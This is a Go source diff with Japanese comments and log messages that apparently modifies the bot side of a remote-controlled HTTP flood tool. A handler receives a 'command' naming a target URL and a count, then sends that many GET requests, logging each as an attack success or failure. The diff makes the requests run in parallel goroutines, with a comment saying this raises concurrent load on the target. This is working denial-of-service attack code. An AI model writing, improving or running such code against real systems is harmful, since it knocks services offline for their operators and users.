@@ -6,6 +6,7 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"sync"
 )
 
 func main() {
@@ -26,16 +27,22 @@ func main() {
 
 		log.Printf("命令を受信。標的(%s)に %d 回攻撃します。\n", targetURL, count)
 
-		// 指定回数だけ標的を殴る
+		// 指定回数を並列に投げて、target 側の同時実行を増やす
+		var wg sync.WaitGroup
+		wg.Add(count)
 		for i := 0; i < count; i++ {
-			resp, err := http.Get(targetURL)
-			if err != nil {
-				log.Printf("攻撃失敗: %v\n", err)
-			} else {
-				log.Printf("攻撃成功(ステータス: %d)\n", resp.StatusCode)
+			go func() {
+				defer wg.Done()
+				resp, err := http.Get(targetURL)
+				if err != nil {
+					log.Printf("攻撃失敗: %v\n", err)
+					return
+				}
 				defer func() { _ = resp.Body.Close() }()
-			}
+				log.Printf("攻撃成功(ステータス: %d)\n", resp.StatusCode)
+			}()
 		}
+		wg.Wait()
 
 		_, _ = fmt.Fprintf(w, "%d 回の攻撃、完了しました。\n", count)
 	})
